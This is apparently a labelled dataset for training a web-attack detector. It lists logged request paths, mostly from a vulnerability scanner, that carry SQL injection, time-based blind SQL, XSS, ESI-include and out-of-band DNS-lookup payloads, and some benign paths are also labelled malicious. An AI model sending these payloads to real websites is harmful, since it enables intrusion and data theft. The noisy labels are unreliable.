sentences	labels
wla/*********/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271 and 8015=1236-- 	 1
zwgk/****/bmjs/zzqzfzcbmyzstsjg/zzqsthjt/zzqhbt/\"javascript:void(0)\" 	 1
xxgk/******/tjj/zfxxgkml_2127/jytabljg_2061/list.html?new=0.7714426940466816<esi:include src=""http://bxss.me/rpb.png""/> 	 1
was5/***/search?page=2&channelid=253477&searchword=1' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)-- &keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
socket.gethostbyname(""hitcf"" ""mhpadqyid427b.bxss.me."")[3].to_s) ""/****/202001/t20200119_146666.html 	 1
vc/**/lib"" and 2*3*8=6*8 and ""ouzs""=""ouzs/easyui/plugins/jquery.resizable.js 	 1
xwzx/****/2021_jtyw/202110/t20211012_318335.html' and 'x'='y 	 1
module/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/******/jquery.js 	 1
xq/***/javascript:void(0); 	 1
module'||'/*****/urite/urite.min.js 	 1
render/http://*******/t/fit.txt 	 1
was5/***/search?channelid=299868&perpage=1000') or 7986=0374  	 1
en/******/style_ly.css 	 1
system' and 2*3*8=6*8 and 'ssh9'='ssh9/********/js/jquery/jquery-latest.min.js 	 1
xxgk/*****/1088/1091/list.html?new=bxss.me/t/xss.html? 	 1
userfiles/*****/ali.php 	 1
module/**********/visit.jsp?i_articleid[0]==2"and/**/extractvalue(1,concat(char(126),md5(1686723685)))and"and 3 in &i_articleid[1]=3&i_columnid=15&i_webid=1&type=3 	 1
zzsl/ccp_48498/****/\"javascript:void(0)\" 	 1
'""()&%<acx><script >u9tg(9588)</script>/****/swsj/ 	 1
index/******/2019/10/18/javascript:window.print() 	 1
news/********/fengxianfangfan?page=1*/-->'""></iframe></script></style></title></textarea><script >alert(99826)</script> 	 1
admin/*******/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) 	 1
ywzzq/*****/system.html?step=2&device=et"/><script>alert(777);</script>bh0 	 1
socket.gethostbyname(""hitqu"" ""phgiybkx064c2.bxss.me."")[3].to_s) ""/******/t20210906_186411.html 	 1
dss/***/_log/error-log 	 1
2021zt/***/""><script>alert(28)</script> 	 1
qhly/******/2007/06/14/javascript:window.print() 	 1
xxgk/*****/http://bxss.me/t/fit.txt/1110/list.html 	 1
zwgk/****/20.htm 	 1
ru/********/modal_sendmail.aspx?from=user&usernamecollection=anony' and ('anony' 'secsiteserverinj' @@version)>0 and '1'='1 	 1
socket.gethostbyname(""hitpc"" ""pejmiync51f52.bxss.me."")[3].to_s) ""/****/ 	 1
jsearchfront/********/jcse/'""()&%<acx><script >67jp(9098)</script>/16/images/ui.css 	 1
xxgk/*****/1088/'.gethostbyname(lc('hitey'.'mjkkhjcdb2dfe.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(98).chr(74).chr(117).chr(73).'/list.html 	 1
en/******/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
xxgk%' and 2*3*8=6*8 and 'u3sk'!='u3sk%/******/tjj/ 	 1
xxgk/******/zdxm_3700/list.html?new=0.9515294361672539'""()&%<acx><script >jv9m(9110)</script> 	 1
ztzl/****/qyddt/202005/t20200527_247881.html' and 'x'='y 	 1
kjcx/****/swb/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
nbfw/*******/gvideos.php?gid=1 and 1=1 	 1
rlzy/****/index_117.html' and 'x'='y 	 1
was5/***/search?channelid=299868) and 2709=2709#&perpage=1000 	 1
brp/*****/tologinftl.z?filterurl='||' 	 1
wla/*********/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271%') and 0467=0888 and '%'=' 	 1
xq/******/2020/12/22/javascript:void(0); 	 1
zmhd/*****/"".gethostbyname(lc(""hityr"".""ukcohtyo91763.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(117).chr(84).chr(112).chr(67).""/202109/t20210906_186411.html 	 1
xxgk/******/tjj/zfxxgkml'||'_2127/xwfbh_2065/list.html 	 1
zwgk/******/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/szss/plq/xmb_gzdxb.htm 	 1
was5/***/search?channelid=299868&perpage=1000) and 1797=9156# 	 1
newscenter/******/2021/12/18/javascript:window.close(); 	 1
outurl/***/sys/listabd2.jsp?bd="/><script>alert(777)</script> 	 1
images'""()&%<acx><script >jo8l(9029)</script>/***/lmy.css 	 1
socket.gethostbyname(""hitnc"" ""filvzypodc16a.bxss.me."")[3].to_s) ""/***/jpage/jquery.jpage.js 	 1
en/********/instrumentequipment/201505/t20150513_60360.html 	 1
xwdt/zjdt'||'/****/zcwj/1.htm 	 1
newscenter/******/2015/02/14/011639118.shtml 	 1
vc/ui<esi:include src=""http://*******/rpb.png""/>/css/page.css 	 1
_dwr%' and 2*3*8=6*8 and 'kahn'!='kahn%/*********/newssearchdwr.js 	 1
zwgk'||'/****/bmjs/qtdw/ 	 1
was5/***/search?channelid=253477&keyword=the&orderby=-docreltime' and 2*3*8=6*8 and 'txzr'='txzr&outlinepage=10&page=2&perpage=15&searchword=the 	 1
ldzc/****/swsj/?wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") 	 1
yqlj/******/common/newaccount.aspx?ddlculture=alert(777) 	 1
css/***/sa3/addholiday.do 	 1
module/********/down.jsp?i_id=194814&colid=72');select sleep(5) 	 1
xxgk/******/zdxm_3700/list.html?new=0""xor(if(now()=sysdate(),sleep(3),0))xor""z 	 1
vc/**/lib'||'/easyui/plugins/jquery.linkbutton.js 	 1
web/********/fonts/fontawesome-webfont.ttf?v=4.3.0</textarea>--><xss_e60acd816cc8da4108b05177eded67f1/><!--<textarea> 	 1
en/***********/rdandmanufacture/ and 1>1 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(967)</script>?_=1630311675687 	 1
news/******/65807.htm?rand=2 and 4863=(select 4863 from pg_sleep(5)) 	 1
ztzl/***************/administration.php?pageaction=saverelease&subaction=submit&dateday=&datemonthnewedit=&dateyearnewedit=&title=<script>alert('777')</script>&summary=deneme&releasebody=deneme&categorynewedit=1&publish=active 	 1
xwzx/****/sgaj/201812/t20181208_'""()&%<acx><script >ysri(9227)</script>.html 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(931)</script>?_=1630311662869 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(3430)">?_=1630311871385 	 1
zwgk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/szss/plq/xmb_gzdxb.htm 	 1
col/****/index.html"" and ""x""=""x 	 1
module/**********/visit.jsp?i_columnid=1&i_webid=1'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1181725030')))>'0&type=1 	 1
vc/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/***/page.css 	 1
qyzz/***/ltgsz.com?n=11) and 3458=(select 3458 from pg_sleep(5)) and (4012=4012 	 1
index/******/2020/09/30/javascript:window.close(); 	 1
news/**************/cyprus 	 1
module/********/downfile.jsp?classid=bxss.me&filename=ad2956b5c62a469ea6bac71f9dae4ee9.doc 	 1
system/********/interview/room.jsp?wbinterviewid=1033%' or 9019=7490 and '%%'='%&owner=1707212448 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15) and 1596=1596#&outlinepage=10 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15' or 8562=0545  	 1
system/********/code/datainput.jsp?owner=' or 3579=4925 and '1'='1 	 1
swld/******/2021/06/18/javascript:window.close(); 	 1
kefuzhongxin/0""xor(if(now()=sysdate(),sleep(9),0))xor""z/****/2017-02-15/406.html 	 1
system/********/interview/room.jsp?wbinterviewid=1033%' and 8582=3515 and '%'='&owner=1707212448 	 1
jsearchfront/********/jcse/110105008056111/16/http://bxss.me/t/fit.txt/plugin/voice/voice.css 	 1
ldzc/*****/201611/t20161121_76519.html?leader="".gethostbyname(lc(""hitcw"".""ltwulkbhb6cdf.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(108).chr(65).chr(104).chr(73)."" 	 1
zwgk/******/ncwywfgz' and 2*3*8=6*8 and 'r9sd'='r9sd/wzs/ltq/xmb_gzdxb.htm 	 1
z/******/index/d5bd64e8e58af018c57671623349a002'""()&%<acx><script >la0c(9234)</script>.css 	 1
gygj/****/kmbg/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
jsearchfront/********/jcse//xfs.bxss.me/16/images/ui.css 	 1
index/****/flgw/? 	 1
was5/***/search?searchword=1') and 9200=6133  	 1
images/genixcms-master/genixcms-master/*******/index.php?page=posts&q=1'alert(777) 	 1
was5/***/css/jquery-ui.min.css 	 1
lxwm/*****/edit.php?menu="">pt>alert(777); script>pt> 	 1
xxgk/******/2014/list'||'.html 	 1
qhsw/********/<img src="javascript:alert(292)"> 	 1
wla/*********/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270' or 9959=1321  	 1
socket.gethostbyname('hitzq' 'ruhqorxt2bd20.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/view.js 	 1
2008zt/******/2008/09/08/002594449.shtml 	 1
xwdt/****/zjdt/zcwj/16.htm 	 1
ldzc/bysw'""()&%<acx><script >qjl0(9840)</script>/******/t20200119_146666.html 	 1
was5/***/search?channelid=*/-->'""></iframe></script></style></title></textarea><script >alert(08068)</script> 	 1
socket.gethostbyname(""hityv"" ""chyczyuye4225.bxss.me."")[3].to_s) ""/*******/jquery.window.js 	 1
jsearchfront/********/jcse/110105008056111/16/'""()&%<acx><script >k6qi(9121)</script>/jquery.cookie.js 	 1
zlxz/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 1
socket.gethostbyname(""hitae"" ""trvckcse8fb63.bxss.me."")[3].to_s) ""/*******/cookie/jquery.cookie.js 	 1
vc/if(now()=sysdate(),sleep(15),0)/***/easyui/themes/bootstrap/linkbutton.css 	 1
e/******/viewclick/?addclick=-1); waitfor delay '0:0:4.2989999999999995' -- &classid=94&id=163 	 1
ywzzq/******/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) 	 1
xinanyanjiu/*************/heisebankuai/2021-05-14/javascript:void(0) 	 1
col/*****/index.html/"><script>alert(829)</script> 	 1
ztzl/****/zyzs/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
kjcx/*******/gjjcxsdqy/ 	 1
/***********/template/jcse/110105008056111/16/images/css.js 	 1
xxgk/*****/'.gethostbyname(lc('hittm'.'ucdonsird9785.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(119).chr(85).chr(103).chr(86).'/1104/list.html 	 1
ywzzq/*****/dash_status.php?status_data[1]=alert(777); 	 1
newscenter/******/2021/09/07/013447361'""/><img src=javascript:alert(817)>.shtml 	 1
jsearchfront/********/jcse/110105008056111//xfs.bxss.me/images/condition.js 	 1
zwgk/*******/fdzdgknr/if(now()=sysdate(),sleep(12),0)/1.htm 	 1
zwgk/*****/5619/5624/\"javascript:void(0)\" 	 1
icons/******/index.php?tid=default&lid=en_uk&f_email="">alert(777) 	 1
art/****/10/11<esi:include src=""http://bxss.me/rpb.png""/>/art_34_242319.html 	 1
ywly/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
index/******/2021/01/21/013323672.shtml?appscan=>"><script>alert(125)</script> 	 1
jsearchfront/********/jcse/110105008056111/16/images/http://bxss.me/t/fit.txt.js 	 1
ztzl/******/ywdt/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 1
system/********/storage/localupload.jsp?doaction=save&rid=1rnott09fg if(now()=sysdate(),sleep(6),0)/*'xor(if(now()=sysdate(),sleep(6),0))or'""xor(if(now()=sysdate(),sleep(6),0))or""*/&uptoken=1ff87566684b40c688f756b86e2c3798 	 1
was5/***/search?channelid=253477&keyword=the&orderby=-docreltime&outlinepage=if(now()=sysdate(),sleep(15),0)&page=3&perpage=15&searchword=the 	 1
zwgk%' and 2*3*8=6*8 and 'jxva'!='jxva%/******/bzxajgc1/1.htm 	 1
was5/***/search?perpage=*/-->'""></iframe></script></style></title></textarea><script >alert(05961)</script> 	 1
skin/**/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/jsencrypt.min.js 	 1
module/**********/visit.jsp?type=2&i_webid=1&i_columnid=4979' and 'f'='f') -- 	 1
zwgk/zdlygk'||'/********/szss/plq/xmb_gzdxb.htm 	 1
cgi-bin/*****/edit.php?title="">pt>alert(777);< /script>pt> 	 1
jsearchfront/********/http://bxss.me/t/fit.txt/110105008056111/16/images/view.js 	 1
xxgk/******/gjjj/" and "x"="y 	 1
module/**********/visit.jsp?i_columnid=1&i_webid=1&type[0]=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1934395690')))&type[1]==1 	 1
htmleditor/******/filemanager/browser/mcpuk/connectors/php/commands/helpers/progress.cgi 	 1
fzgn<esi:include src=""http://*******/rpb.png""/>/wzdt/ 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/analysis'""()&%<acx><script >ljha(9683)</script>/jquery.windstagball.js 	 1
col/*****/index.html"" and ""x""=""x 	 1
gygj/****/zghtlxgj/ 	 1
ru/****/prototype/1/session/check/something<img src=a onerror=alert(777)> 	 1
system/********/pdfjs/build/fqaabdgaaaaet1mvmlynywkaaaegaaaaygntyxabdqluaaacnaaaaujozwfk/index.jsp/*/-->'""></iframe></script></style></title></textarea><script >alert(83601)</script> 	 1
inc/**********/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); 	 1
was5/***/search?channelid=299868%' or 1192=2096 and '%%'='%&perpage=1000 	 1
z'""()&%<acx><script >bery(9174)</script>/******/index/ef90f68c5578ccfd29b18250450d0233.css 	 1
2017zt/******/2017/10/24/javascript:void(0); 	 1
html/**/misc/swfupload//swfupload_f8.swf?moviename="]);}catch(e){}if(!self.a)self.a=!alert(1);// 	 1
newscenter/******/2011/06/29/010398786.shtml 	 1
xwzx/****/jtwxq/202012/ 	 1
prn/********/modal_sendmail.aspx?from=user&usernamecollection=anony' and ('anony' 'secsiteserverinj' @@version)>0 and '1'='1 	 1
sites/***/modules/civicrm/packages/openflashchart/open-flash-chart.swf?get-data=(function(){alert(document.domain)})() 	 1
xwzx/****/2021_jtyw/202109//*/-->'""></iframe></script></style></title></textarea><script >alert(76934)</script> 	 1
ztpd/******/count/0036012/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
zwgk/****/bmyjs/zzqfyxt/txxrmfy/\"javascript:void(0)\" 	 1
if(now()=sysdate(),sleep(15),0)/***/hanweb.min.css 	 1
jsearchfront/********/jcse/110105008056111/16/http://bxss.me/t/fit.txt/catesearchbtn.js 	 1
gjjtwzq/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
xxgk/******/tjj/zfxxgkml_2127/hygq_2064/list.html?new="".gethostbyname(lc(""hitit"".""cubqnkey2ec7b.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(107).chr(71).chr(99).chr(78)."" 	 1
zwgk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/1.htm 	 1
video/*****/system.html?step=2&device=et"/><script>alert(777);</script>bh0 	 1
2020zt/******/2021/09/13/javascript:void(); 	 1
index.php/****/findpass_msg.html?ac=email and 6908=6908 	 1
jsearchfront/**********/dimension.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=1&pos=filenumber&pq=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&q=«Î ‰»Îπÿº¸¥ &searchid=44&tpl=16&websiteid=110105008056111 	 1
cgi-bin/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
zwgk/if(now()=sysdate(),sleep(12),0)/*******/gys.htm 	 1
jsearchfront/**********/autocomplete.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&q=«Î ‰»Îπÿº¸¥ &searchid=1&tpl=16&websiteid=110105008056111 	 1
en/*******/companyprofile/" and "x"="y 	 1
was5/***/search?channelid=*/-->'""></iframe></script></style></title></textarea><script >alert(28290)</script> 	 1
hdjl'""()&%<acx><script >0gna(9935)</script>/****/202103/t20210303_2614145.html 	 1
es/****/tipsloginsubmit.action 	 1
socket.gethostbyname('hitju' 'vojvtusa13c34.bxss.me.')[3].to_s) '/******/t20210806_185416.html 	 1
system%' and 2*3*8=6*8 and 'odnb'!='odnb%/********/js/centercutimg.js 	 1
art/****/if(now()=sysdate(),sleep(15),0)/15/art_31_223689.html 	 1
xxgk/******/tjj/zfxxgkml_2127/xwfbh_2065/list.html?new='.gethostbyname(lc('hitnc'.'vmdszddx892f2.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(107).chr(89).chr(105).chr(65).' 	 1
video/******/common/newaccount.aspx?btncancel=alert(777) 	 1
tupian/********/""><script>alert(514)</script> 	 1
swld/******/2021/11/15/javascript:window.print() 	 1
web/********/fonts/fontawesome-webfont.ttf?v=4.3.0</textarea>--><xss_5c51cb1c64e40d44876c222814e1e3ae/><!--<textarea> 	 1
0""xor(if(now()=sysdate(),sleep(15),0))xor""z/*****/index.html 	 1
pic/*/02/04/40/2044085_113792.png 	 1
fxgg/********/javascript:void(0); 	 1
gygj/****/ 	 1
ddjs/****/202009/t20200921_253740.html' and 'x'='y 	 1
?/**/***/**/8=8 	 1
zwgk/****/bmyjs/zzqfyxt/zzqgyzzqtlfy_1817/\"javascript:void(0)\" 	 1
newscenter/******/2021/10/10/javascript:void(); 	 1
jsearchfront/********/jcse'""()&%<acx><script >v4yy(9934)</script>/website.js 	 1
was5/***/search?iptsword=*/-->'""></iframe></script></style></title></textarea><script >alert(89676)</script> 	 1
xxgk<esi:include src=""http://*******/rpb.png""/>/xxgknb/2012/list.html 	 1
jsearchfront/template<esi:include src=""http://*******/rpb.png""/>/jcse/110105008056111/16/images/hanweb.css 	 1
zwgk/******/ncwywfgz%' and 2*3*8=6*8 and 'osyp'!='osyp%/zws/znx/xmb_gzdxb.htm 	 1
module/********/downfile.jsp?classid=0&filename=5b3c34d3371f43c19b0a669176cfe2ad.doc' and 4064=9498 and 'hzal'='hzal 	 1
zfld/******/2021/11/06/javascript:window.print() 	 1
was5/***/search?searchword=1&channelid=287219' and 5390=3653 and '1'='1&perpage=24&templet=1&token=1 	 1
public/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
kjzhxlcp/**********/*/-->'""></iframe></script></style></title></textarea><script >alert(67798)</script> 	 1
index/******/2019/08/21/javascript:window.close(); 	 1
2016zt/******/2016/12/22/javascript:void(0); 	 1
was5/***/search?channelid=234439&orderby=relevance&perpage=24&searchword=1' and 8741=8741 and '1'='1 	 1
if(now()=sysdate(),sleep(15),0)/*****/hfswsj/ 	 1
tencent:/*******/?uin=2420546317&site=www.paichen.net&menu=yes) and 1=2 ( 	 1
zmhd/*****/hfswsj/zmhdyc.html?wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") 	 1
socket.gethostbyname('hitrz' 'fhlmhwob372a1.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/plugin/websitechange/zwdt_v3.css 	 1
module/*****/ckplayer/ 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1' or 6798=6798  	 1
igi/****/opengovmsgbox.do?appid=4'and'm'='m&method=listgovmsgboxs&pagesize=3&siteid=115 	 1
jsearchfront/'""()&%<acx><script >k6qi(9281)</script>/****/110105008056111/16/images/jquery.cookie.js 	 1
public/*******/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin 	 1
video/******/common/newaccount.aspx?email=alert(777) 	 1
xxgk/******/tjj/zfxxgkml_2127/xwfbh<esi:include src=""http://bxss.me/rpb.png""/>_2065/list.html 	 1
images/*****/upgrade_unattended.php?db_type=<script>alert(777)</script> 	 1
zmhd' and 2*3*8=6*8 and 'fapa'='fapa/*****/hfswsj/202109/t20210906_186411.html 	 1
ztzl/********/wzqh_zyjs/' and 'x'='x 	 1
zfld/******/2021/12/11/javascript:window.print() 	 1
ztpd/******/whlz/javascript:void(0); 	 1
newscenter/******/2021/08/05/013431082.shtml 	 1
xxgk/******/202010/t20201009_254278.html' and 'x'='y 	 1
xq/******/2021/01/19/javascript:void(0); 	 1
was5/***/search?channelid=222832&outlinepage=10&page=4172&perpage=20; waitfor delay '0:0:2 	 1
socket.gethostbyname(""hityq"" ""qdlmfaax96d6c.bxss.me."")[3].to_s) ""/******/searchbtn.js 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin'||'/analysis/jquery.windstagball.js 	 1
qhly/******/2006/09/26/javascript:dozoom(9) 	 1
n42684/*******/n236781'||'/c1556969/content.html 	 1
system/********/code/datainput.jsp?owner=' or 9667=1523  	 1
xxgk/xxgkml'""()&%<acx><script >vmvx(9678)</script>/*******/list.html 	 1
wp-content/*******/csrs/akismet.php 	 1
system/********/js%' and 2*3*8=6*8 and '3o2v'!='3o2v%/gotopage.js 	 1
was5/***/search/search?page=3';select sleep(5) 	 1
qhly/******/2016/04/21/javascript:dozoom(12) 	 1
qhly/******/2016/10/27/javascript:dozoom(12) 	 1
was5/***/search?channelid=299868%' or 2121=6846 and '%'='&perpage=1000 	 1
zwgk/****/bmyjs/rmtt/yx/\"javascript:void(0)\" 	 1
zwgk/****/bmjs/zzqjcyxt/hsbqrmjcy/\"javascript:void(0)\" 	 1
ldzc/'.gethostbyname(lc('hitti'.'dqzqvedbf25bc.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(100).chr(68).chr(115).chr(71).'/******/t20161016_531.html 	 1
images/*/layout.js/""><script>alert(494)</script> 	 1
col/*******/index.html/"><script>alert(568)</script> 	 1
zfld/******/2021/12/16/javascript:window.print() 	 1
xwdt' and 2*3*8=6*8 and 'calb'='calb/****/zjdt/gzdt.htm 	 1
vc'""()&%<acx><script >sgmr(9944)</script>/**/lib/easyui/plugins/jquery.parser.js 	 1
en/***********/projectcontracting/201412/t20141210_22180.html 	 1
qhly/******/2021/11/29/javascript:window.close(); 	 1
socket.gethostbyname('hittx' 'lelkrjee9ff86.bxss.me.')[3].to_s) '/****/1104/list.html 	 1
lcgg/********/javascript:void(0); 	 1
newscenter/******/2021/12/20/javascript:window.print() 	 1
news/********/chukoufengxianyujing?page=1 and 6206=6206 	 1
icons/******/common/signin.aspx?tbpassword=alert(777)returnurl=/******/common/default.aspx 	 1
xxgk//***********/tjj/zfxxgkml_2127/xwfbh_2065/list.html 	 1
xq/*****/service/166/exec 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(4922)</script>?_=1630312208964 	 1
jsearchfront/********/jcse/110105008056111/16/bxss.me/view.js 	 1
jsearchfront/********/http://bxss.me/t/fit.txt/110105008056111/16/images/jquery.waterfall.js 	 1
xxgk/*****/1079/http://bxss.me/t/xss.html? 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(3744)</script>?_=1630312029023 	 1
fr/****/201808/t20180808_194915.html 	 1
vc/**/lib/easyui/plugins"" and 2*3*8=6*8 and ""imvs""=""imvs/jquery.messager.js 	 1
zwgk/****/bmjs/zzqzfzcbmyzstsjg/zzqkjt/\"javascript:void(0)\" 	 1
theme/**********/bxslider-4/jquery.bxslider.js/<img src="javascript:alert(20)"> 	 1
ztzl/****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
nul/****/admin/configure_extensions.php?display=</script><script>confirm(777)</script> 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(784)">?_=1630311590850 	 1
jsearchfront/********/jcse'||'/110105008056111/16/images/plugin/voice/voice.css 	 1
ztpd/**********/lhsd/lhsdt/javascript:void(0); 	 1
newscenter/******/2015/04/15/011691219.shtml 	 1
2012zt/******/2012/07/24/010836164.shtml 	 1
icons/********/modal_sendmail.aspx?from=user&usernamecollection=anony' and ('anony' 'secsiteserverinj' @@version)>0 and '1'='1 	 1
xxgk/******/tjj/zfxxgkml<esi:include src=""http://bxss.me/rpb.png""/>_2127/xwfbh_2065/list.html 	 1
zwgk/******/ncwywfgz'||'/ycs/lws/xmb_gzdxb.htm 	 1
zfld/******/2018/02/02/javascript:window.print() 	 1
vc/**/widgets/scrollup//xfs.bxss.me/themes/image.css 	 1
zzsl/******/202107/t20210723_2938511<esi:include src=""http://bxss.me/rpb.png""/>.html 	 1
index/******/2020/06/24/javascript:window.print() 	 1
css/data:image/svg xml;charset=utf-8,<svg xmlns='http://**********/2000/svg' viewbox='0 0 27 44'><path d='m0,22l22,0l2.1,2.1l4.2,22l19.9,19.9l22,44l0,22l0,22l0,22z' fill='#000000'/></svg> 	 1
socket.gethostbyname('hitvr' 'afhksgmvd8c02.bxss.me.')[3].to_s) '/***************/16/images/ui.css 	 1
vc/**/widgets/hanweb/placeholder/placeholder"" and 2*3*8=6*8 and ""s6aq""=""s6aq.js 	 1
module/**********/visit.jsp?i_columnid=1&i_webid[0]==2and 3 in &i_webid[1]=3"and/**/extractvalue(1,concat(char(126),md5(1580028230)))and"&type=1 	 1
spzq/********/javascript:void(0); 	 1
was5/***/search?searchword=1&channelid=287219&perpage=24&templet=1%' or 4949=4949 and '%'='&token=1 	 1
col"" and 2*3*8=6*8 and ""vkpr""=""vkpr/******/index.html 	 1
xxgk/******/tjj/tjjysqgk/gkcx/list.html?new=bxss.me 	 1
lz/******/2021/08/04/javascript:void(0); 	 1
templates/********/index.aspx?nodeid=394');select pg_sleep(5)-- 	 1
vc/**/widgets/cookie/http://bxss.me/t/fit.txt?.cookie.js 	 1
zwgk/*****/list_1' waitfor delay '0:0:2.html 	 1
xwzx//***********/bmleft.html 	 1
vc/**/widgets/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/placeholder/placeholder.js 	 1
gygj/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
xxgk/******/2014/list.html?new=0.963632956696624'""()&%<acx><script >be2z(9071)</script> 	 1
if(now()=sysdate(),sleep(12),0)/******/ncwywfgz/ycs/lws/xmb_gzdxb.htm 	 1
xwzx/****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
zwgk/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/*******/szss/plx.htm 	 1
vc/**/widgets/hanweb/ie6fixed/http://bxss.me/t/fit.txt?.jpg.js 	 1
wla/*********/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271%' and 4150=6502 and '%%'='% 	 1
0""xor(if(now()=sysdate(),sleep(15),0))xor""z/***/jpage/theme/default/css/jpage.css 	 1
socket.gethostbyname(""hitnt"" ""thgkaznbd9114.bxss.me."")[3].to_s) ""/***/phone.js 	 1
zwgk/******/if(now()=sysdate(),sleep(12),0)/zzq/zcwj.htm 	 1
jsearchfront/********/jcse/110105008056111/16/'""()&%<acx><script >cac6(9125)</script>/view.js 	 1
news/********/chanyezhiyin?page=*/-->'""></iframe></script></style></title></textarea><script >alert(25133)</script> 	 1
wp-includes/**/plupload//plupload.flash.swf?id=""));}catch(e){alert(1);}// 	 1
system/********/code/news/click/addclicktimes.jsp?wburlid=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1777549618'))) 	 1
newscenter/******/2021/10/04/javascript:window.close(); 	 1
x241/****/interface/jtree.jsp?type=2&webid=1&password=*&userid=admin' and '1'='1 	 1
